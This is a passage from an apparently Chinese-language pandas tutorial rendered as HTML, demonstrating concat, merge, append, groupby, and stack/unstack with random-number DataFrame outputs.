<td>-0.838252</td>      <td>1.117676</td>      <td>0.880839</td>      <td>-1.118529</td>    </tr>    <tr>      <th>5</th>      <td>1.706060</td>      <td>0.290877</td>      <td>-0.907941</td>      <td>-0.532450</td>    </tr>    <tr>      <th>6</th>      <td>0.118169</td>      <td>-0.496975</td>      <td>-0.190422</td>      <td>0.783875</td>    </tr>    <tr>      <th>7</th>      <td>-1.213645</td>      <td>-0.489622</td>      <td>-0.798443</td>      <td>-0.471611</td>    </tr>    <tr>      <th>8</th>      <td>-0.314598</td>      <td>-2.658906</td>      <td>-1.139778</td>      <td>0.374437</td>    </tr>    <tr>      <th>9</th>      <td>0.229281</td>      <td>-1.372309</td>      <td>0.996916</td>      <td>-1.013462</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># break it into pieces</span>pieces <span class="token operator">=</span> <span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> df<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> df<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span>pieces</code></pre><pre><code>[          0         1         2         3 0 -0.089143  0.087569  0.218078 -0.336815 1 -0.694835  0.108324 -1.882762 -0.220210 2 -2.069784 -0.788424 -1.694595  0.569263,           0         1         2         3 3  2.433036  0.719851 -0.109935  0.177864 4 -0.838252  1.117676  0.880839 -1.118529 5  1.706060  0.290877 -0.907941 -0.532450 6  0.118169 -0.496975 -0.190422  0.783875,           0         1         2         3 7 -1.213645 -0.489622 -0.798443 -0.471611 8 -0.314598 -2.658906 -1.139778  0.374437 9  0.229281 -1.372309  0.996916 -1.013462]</code></pre><pre class=" language-python"><code class="language-python">pd<span class="token punctuation">.</span>concat<span class="token punctuation">(</span>pieces<span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>0</th>      <th>1</th>      <th>2</th>      <th>3</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-0.089143</td>      <td>0.087569</td>      <td>0.218078</td>      <td>-0.336815</td>    </tr>    <tr>      <th>1</th>      <td>-0.694835</td>      <td>0.108324</td>      <td>-1.882762</td>      <td>-0.220210</td>    </tr>    <tr>      <th>2</th>      <td>-2.069784</td>      <td>-0.788424</td>      <td>-1.694595</td>      <td>0.569263</td>    </tr>    <tr>      <th>3</th>      <td>2.433036</td>      <td>0.719851</td>      <td>-0.109935</td>      <td>0.177864</td>    </tr>    <tr>      <th>4</th>      <td>-0.838252</td>      <td>1.117676</td>      <td>0.880839</td>      <td>-1.118529</td>    </tr>    <tr>      <th>5</th>      <td>1.706060</td>      <td>0.290877</td>      <td>-0.907941</td>      <td>-0.532450</td>    </tr>    <tr>      <th>6</th>      <td>0.118169</td>      <td>-0.496975</td>      <td>-0.190422</td>      <td>0.783875</td>    </tr>    <tr>      <th>7</th>      <td>-1.213645</td>      <td>-0.489622</td>      <td>-0.798443</td>      <td>-0.471611</td>    </tr>    <tr>      <th>8</th>      <td>-0.314598</td>      <td>-2.658906</td>      <td>-1.139778</td>      <td>0.374437</td>    </tr>    <tr>      <th>9</th>      <td>0.229281</td>      <td>-1.372309</td>      <td>0.996916</td>      <td>-1.013462</td>    </tr>  </tbody></table></div><h3 id="0x08-2-Join"><a href="#0x08-2-Join" class="headerlink" title="0x08-2 Join"></a>0x08-2 Join</h3><p>类似于 SQL 类型的合并。</p><p>下面是 key 相同的情况。</p><pre class=" language-python"><code class="language-python">left <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'lval'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>left</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>lval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>1</td>    </tr>    <tr>      <th>1</th>      <td>foo</td>      <td>2</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">right <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'rval'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>right</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>rval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>4</td>    </tr>    <tr>      <th>1</th>      <td>foo</td>      <td>5</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">,</span> on<span class="token operator">=</span><span class="token string">'key'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>lval</th>      <th>rval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>1</td>      <td>4</td>    </tr>    <tr>      <th>1</th>      <td>foo</td>      <td>1</td>      <td>5</td>    </tr>    <tr>      <th>2</th>      <td>foo</td>      <td>2</td>      <td>4</td>    </tr>    <tr>      <th>3</th>      <td>foo</td>      <td>2</td>      <td>5</td>    </tr>  </tbody></table></div><p>另一个例子，key 不同的情况。</p><pre class=" language-python"><code class="language-python">left <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'lval'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>left</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>lval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>1</td>    </tr>    <tr>      <th>1</th>      <td>bar</td>      <td>2</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">right <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'rval'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>right</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>rval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>4</td>    </tr>    <tr>      <th>1</th>      <td>bar</td>      <td>5</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">,</span> on<span class="token operator">=</span><span class="token string">'key'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>key</th>      <th>lval</th>      <th>rval</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>1</td>      <td>4</td>    </tr>    <tr>      <th>1</th>      <td>bar</td>      <td>2</td>      <td>5</td>    </tr>  </tbody></table></div><h3 id="0x08-3-Append"><a href="#0x08-3-Append" class="headerlink" title="0x08-3 Append"></a>0x08-3 Append</h3><p>将一行加入到一个 DataFrame 上</p><pre class=" language-python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-2.727829</td>      <td>-1.382168</td>      <td>0.961920</td>      <td>0.083472</td>    </tr>    <tr>      <th>1</th>      <td>-0.297131</td>      <td>-0.294723</td>      <td>0.303267</td>      <td>-0.539177</td>    </tr>    <tr>      <th>2</th>      <td>-0.226735</td>      <td>-2.157170</td>      <td>1.559418</td>      <td>0.102023</td>    </tr>    <tr>      <th>3</th>      <td>0.569927</td>      <td>-0.800855</td>      <td>0.918515</td>      <td>1.630873</td>    </tr>    <tr>      <th>4</th>      <td>0.402999</td>      <td>-2.238052</td>      <td>2.181635</td>      <td>1.950669</td>    </tr>    <tr>      <th>5</th>      <td>1.238971</td>      <td>-0.165159</td>      <td>0.688200</td>      <td>0.793499</td>    </tr>    <tr>      <th>6</th>      <td>1.356265</td>      <td>-0.034859</td>      <td>-0.020774</td>      <td>0.485487</td>    </tr>    <tr>      <th>7</th>      <td>-1.793398</td>      <td>0.900625</td>      <td>0.365789</td>      <td>-2.089145</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>df<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ignore_index<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 忽略 index</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-2.727829</td>      <td>-1.382168</td>      <td>0.961920</td>      <td>0.083472</td>    </tr>    <tr>      <th>1</th>      <td>-0.297131</td>      <td>-0.294723</td>      <td>0.303267</td>      <td>-0.539177</td>    </tr>    <tr>      <th>2</th>      <td>-0.226735</td>      <td>-2.157170</td>      <td>1.559418</td>      <td>0.102023</td>    </tr>    <tr>      <th>3</th>      <td>0.569927</td>      <td>-0.800855</td>      <td>0.918515</td>      <td>1.630873</td>    </tr>    <tr>      <th>4</th>      <td>0.402999</td>      <td>-2.238052</td>      <td>2.181635</td>      <td>1.950669</td>    </tr>    <tr>      <th>5</th>      <td>1.238971</td>      <td>-0.165159</td>      <td>0.688200</td>      <td>0.793499</td>    </tr>    <tr>      <th>6</th>      <td>1.356265</td>      <td>-0.034859</td>      <td>-0.020774</td>      <td>0.485487</td>    </tr>    <tr>      <th>7</th>      <td>-1.793398</td>      <td>0.900625</td>      <td>0.365789</td>      <td>-2.089145</td>    </tr>    <tr>      <th>8</th>      <td>0.569927</td>      <td>-0.800855</td>      <td>0.918515</td>      <td>1.630873</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>df<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ignore_index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-2.727829</td>      <td>-1.382168</td>      <td>0.961920</td>      <td>0.083472</td>    </tr>    <tr>      <th>1</th>      <td>-0.297131</td>      <td>-0.294723</td>      <td>0.303267</td>      <td>-0.539177</td>    </tr>    <tr>      <th>2</th>      <td>-0.226735</td>      <td>-2.157170</td>      <td>1.559418</td>      <td>0.102023</td>    </tr>    <tr>      <th>3</th>      <td>0.569927</td>      <td>-0.800855</td>      <td>0.918515</td>      <td>1.630873</td>    </tr>    <tr>      <th>4</th>      <td>0.402999</td>      <td>-2.238052</td>      <td>2.181635</td>      <td>1.950669</td>    </tr>    <tr>      <th>5</th>      <td>1.238971</td>      <td>-0.165159</td>      <td>0.688200</td>      <td>0.793499</td>    </tr>    <tr>      <th>6</th>      <td>1.356265</td>      <td>-0.034859</td>      <td>-0.020774</td>      <td>0.485487</td>    </tr>    <tr>      <th>7</th>      <td>-1.793398</td>      <td>0.900625</td>      <td>0.365789</td>      <td>-2.089145</td>    </tr>    <tr>      <th>4</th>      <td>0.402999</td>      <td>-2.238052</td>      <td>2.181635</td>      <td>1.950669</td>    </tr>  </tbody></table></div><h2 id="0x09-分组-Grouping"><a href="#0x09-分组-Grouping" class="headerlink" title="0x09 分组 Grouping"></a>0x09 分组 Grouping</h2><p>对于分组(group by)，通常有下面几个操作步骤：</p><ul><li><p>Splitting 按照一些规则将数据分为不同的组</p></li><li><p>Applying 对于每组数据分别执行一个函数</p></li><li><p>Combining 将结果组合到一个数据结构中</p></li></ul><pre class=" language-python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'A'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span>                         <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                  <span class="token string">'B'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">,</span>                         <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                  <span class="token string">'C'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                  <span class="token string">'D'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>foo</td>      <td>one</td>      <td>1.038586</td>      <td>2.040014</td>    </tr>    <tr>      <th>1</th>      <td>bar</td>      <td>one</td>      <td>0.454452</td>      <td>-0.553457</td>    </tr>    <tr>      <th>2</th>      <td>foo</td>      <td>two</td>      <td>-0.730273</td>      <td>-0.207136</td>    </tr>    <tr>      <th>3</th>      <td>bar</td>      <td>three</td>      <td>0.435136</td>      <td>0.443462</td>    </tr>    <tr>      <th>4</th>      <td>foo</td>      <td>two</td>      <td>2.557988</td>      <td>-1.831259</td>    </tr>    <tr>      <th>5</th>      <td>bar</td>      <td>two</td>      <td>1.131084</td>      <td>0.915332</td>    </tr>    <tr>      <th>6</th>      <td>foo</td>      <td>one</td>      <td>1.078171</td>      <td>0.037355</td>    </tr>    <tr>      <th>7</th>      <td>foo</td>      <td>three</td>      <td>2.057203</td>      <td>1.209778</td>    </tr>  </tbody></table></div><p>分组并对得到的分组执行<code>sum</code>函数。</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>C</th>      <th>D</th>    </tr>    <tr>      <th>A</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th>bar</th>      <td>-1.001520</td>      <td>1.880284</td>    </tr>    <tr>      <th>foo</th>      <td>1.365107</td>      <td>1.459170</td>    </tr>  </tbody></table></div><p>通过多个列进行分组形成一个层次(hierarchical)索引，然后执行函数。</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th></th>      <th>C</th>      <th>D</th>    </tr>    <tr>      <th>A</th>      <th>B</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="3" valign="top">bar</th>      <th>one</th>      <td>0.598883</td>      <td>1.667737</td>    </tr>    <tr>      <th>three</th>      <td>-0.605689</td>      <td>-0.531403</td>    </tr>    <tr>      <th>two</th>      <td>-0.994715</td>      <td>0.743951</td>    </tr>    <tr>      <th rowspan="3" valign="top">foo</th>      <th>one</th>      <td>-0.090250</td>      <td>0.694644</td>    </tr>    <tr>      <th>three</th>      <td>0.738067</td>      <td>1.498865</td>    </tr>    <tr>      <th>two</th>      <td>0.717290</td>      <td>-0.734339</td>    </tr>  </tbody></table></div><h2 id="0x0A-重塑-改变形状-Reshaping"><a href="#0x0A-重塑-改变形状-Reshaping" class="headerlink" title="0x0A 重塑/改变形状 Reshaping"></a>0x0A 重塑/改变形状 Reshaping</h2><h3 id="0x0A-1-Stack"><a href="#0x0A-1-Stack" class="headerlink" title="0x0A-1 Stack"></a>0x0A-1 Stack</h3><pre class=" language-python"><code class="language-python">tuples <span class="token operator">=</span> list<span class="token punctuation">(</span>zip<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span><span class="token punctuation">,</span>                      <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'qux'</span><span class="token punctuation">,</span> <span class="token string">'qux'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                     <span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span>                      <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tuples</code></pre><pre><code>[('bar', 'one'), ('bar', 'two'), ('baz', 'one'), ('baz', 'two'), ('foo', 'one'), ('foo', 'two'), ('qux', 'one'), ('qux', 'two')]</code></pre><pre class=" language-python"><code class="language-python">index <span class="token operator">=</span> pd<span class="token punctuation">.</span>MultiIndex<span class="token punctuation">.</span>from_tuples<span class="token punctuation">(</span>tuples<span class="token punctuation">,</span> names<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token string">'second'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>index<span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th></th>      <th>A</th>      <th>B</th>    </tr>    <tr>      <th>first</th>      <th>second</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">bar</th>      <th>one</th>      <td>1.402402</td>      <td>-0.215913</td>    </tr>    <tr>      <th>two</th>      <td>-0.305333</td>      <td>-0.679614</td>    </tr>    <tr>      <th rowspan="2" valign="top">baz</th>      <th>one</th>      <td>0.745205</td>      <td>0.872718</td>    </tr>    <tr>      <th>two</th>      <td>0.421718</td>      <td>-0.662528</td>    </tr>    <tr>      <th rowspan="2" valign="top">foo</th>      <th>one</th>      <td>-1.433628</td>      <td>0.627898</td>    </tr>    <tr>      <th>two</th>      <td>2.129267</td>      <td>-0.260206</td>    </tr>    <tr>      <th rowspan="2" valign="top">qux</th>      <th>one</th>      <td>0.498752</td>      <td>-0.622814</td>    </tr>    <tr>      <th>two</th>      <td>-0.356492</td>      <td>1.364184</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df2 <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>df2</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th></th>      <th>A</th>      <th>B</th>    </tr>    <tr>      <th>first</th>      <th>second</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">bar</th>      <th>one</th>      <td>1.402402</td>      <td>-0.215913</td>    </tr>    <tr>      <th>two</th>      <td>-0.305333</td>      <td>-0.679614</td>    </tr>    <tr>      <th rowspan="2" valign="top">baz</th>      <th>one</th>      <td>0.745205</td>      <td>0.872718</td>    </tr>    <tr>      <th>two</th>      <td>0.421718</td>      <td>-0.662528</td>    </tr>  </tbody></table></div><p><code>stack()</code>方法在 DataFrame 列的层次上进行<strong>压缩</strong> </p><pre class=" language-python"><code class="language-python">stacked <span class="token operator">=</span> df2<span class="token punctuation">.</span>stack<span class="token punctuation">(</span><span class="token punctuation">)</span>stacked</code></pre><pre><code>first  second   bar    one     A    1.402402               B   -0.215913       two     A   -0.305333               B   -0.679614baz    one     A    0.745205               B    0.872718       two     A    0.421718               B   -0.662528dtype: float64</code></pre><p>对于一个经过了 stack 的 DataFrame 或者 Series（以 MultiIndex 作为索引），<code>stack()</code>的逆运算是<code>isunstack()</code>，默认情况下是 unstack 最后一层。 </p><p>就是说，bar、baz是第0级，one、two是第1级，A、B是第2级。</p><pre class=" language-python"><code class="language-python">stacked<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th></th>      <th>A</th>      <th>B</th>    </tr>    <tr>      <th>first</th>      <th>second</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">bar</th>      <th>one</th>      <td>1.402402</td>      <td>-0.215913</td>    </tr>    <tr>      <th>two</th>      <td>-0.305333</td>      <td>-0.679614</td>    </tr>    <tr>      <th rowspan="2" valign="top">baz</th>      <th>one</th>      <td>0.745205</td>      <td>0.872718</td>    </tr>    <tr>      <th>two</th>      <td>0.421718</td>      <td>-0.662528</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">stacked<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>second</th>      <th>one</th>      <th>two</th>    </tr>    <tr>      <th>first</th>      <th></th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">bar</th>      <th>A</th>      <td>1.402402</td>      <td>-0.305333</td>    </tr>    <tr>      <th>B</th>      <td>-0.215913</td>      <td>-0.679614</td>    </tr>    <tr>      <th rowspan="2" valign="top">baz</th>      <th>A</th>      <td>0.745205</td>      <td>0.421718</td>    </tr>    <tr>      <th>B</th>      <td>0.872718</td>      <td>-0.662528</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">stacked<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>first</th>      <th>bar</th>      <th>baz</th>    </tr>    <tr>      <th>second</th>      <th></th>      